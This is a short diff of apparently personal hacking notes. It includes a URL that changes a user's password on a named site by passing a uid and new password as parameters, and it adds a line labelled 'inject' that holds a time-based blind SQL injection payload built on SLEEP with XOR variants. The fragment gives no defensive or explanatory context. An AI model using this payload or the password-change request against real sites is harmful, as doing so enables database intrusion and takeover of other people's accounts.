@@ -6,7 +6,8 @@ liuyislogin
 2.
 http://me.aaisme.com//index.php/user/updatepassword?uid=8237642&newpass=123456789
 
-
+3.inject
+IF(NOW()=SYSDATE(),SLEEP(5),0)/*0x27 XOR(if(now()=sysdate(),sleep(5),0))OR 0x27 "XOR(if(now()=sysdate(),sleep(1),0))OR"*/
 
 bd:
 1.
